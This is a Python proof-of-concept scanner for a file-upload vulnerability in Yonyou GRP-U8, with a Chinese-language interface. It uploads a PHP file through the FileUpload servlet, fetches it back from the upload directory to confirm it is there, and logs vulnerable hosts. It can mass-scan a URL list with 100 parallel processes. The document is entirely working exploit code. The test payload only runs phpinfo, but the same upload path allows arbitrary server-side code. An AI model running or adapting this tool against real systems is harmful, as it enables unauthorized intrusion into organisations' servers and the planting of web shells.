import requests,re,argparse,os,sys
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = '''
    ██╗   ██╗ ██████╗ ███╗   ██╗ ██████╗██╗   ██╗ ██████╗ ██╗   ██╗     ██████╗ ██████╗ ██████╗       ██╗   ██╗ █████╗ 
╚██╗ ██╔╝██╔═══██╗████╗  ██║██╔════╝╚██╗ ██╔╝██╔═══██╗██║   ██║    ██╔════╝ ██╔══██╗██╔══██╗      ██║   ██║██╔══██╗
 ╚████╔╝ ██║   ██║██╔██╗ ██║██║  ███╗╚████╔╝ ██║   ██║██║   ██║    ██║  ███╗██████╔╝██████╔╝█████╗██║   ██║╚█████╔╝
  ╚██╔╝  ██║   ██║██║╚██╗██║██║   ██║ ╚██╔╝  ██║   ██║██║   ██║    ██║   ██║██╔══██╗██╔═══╝ ╚════╝██║   ██║██╔══██╗
   ██║   ╚██████╔╝██║ ╚████║╚██████╔╝  ██║   ╚██████╔╝╚██████╔╝    ╚██████╔╝██║  ██║██║           ╚██████╔╝╚█████╔╝
   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝   ╚═╝    ╚═════╝  ╚═════╝      ╚═════╝ ╚═╝  ╚═╝╚═╝            ╚═════╝  ╚════╝ 
                                                                          version:用友 GRP-U8      
'''
    print(banner)
def main():
    banner()
    # 处理命令行参数
    parser = argparse.ArgumentParser(description="用友GRP-U8 FileUpload 文件上传漏洞")
    #添加参数
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    # 调用
    args = parser.parse_args()

    # print(args.url,args.file)

    # 如果输入的是 url 而不是 文件 调用poc 不开多线程
    # 反之开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace("\n",''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join
    else:
        print(f"Useag: \n\tpython:{sys.argv[0]} -h")
 
def poc(target):
    # 构造poc
    payload = '/servlet/FileUpload?fileName=zcl.php&actionID=update'
    url = target+ payload
    header = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0",
        "Content-Length":"41",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding":"gzip, deflate",
        "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Connection":"keep-alive",
    }
    data = '''
    <?php phpinfo();?>
'''
    url1 = target+'/R9iPortal/upload/zcl.php'
    header1 = {
        "Upgrade-Insecure-Requests":"1",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding":"gzip, deflate, br",
        "Accept-Language":"zh-CN,zh;q=0.9",
        "Connection":"close",

    }
    res = requests.post(url=url,headers=header,data=data,verify=False,timeout=10)
    if res.status_code == 200:
        try:
            res1 = requests.get(url=url1,headers=header1,verify=False,timeout=10)
            if  '<?php phpinfo();?>' in res1.text:
                print(f"[+]此url{target}存在漏洞")
                with open('result.txt','a',encoding='utf-8') as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-]此url{target}不存在漏洞")
        except Exception as e:
            print(f"[*]此url{target}可能存在访问问题，请手工测试")
if __name__ ==  '__main__':
    main()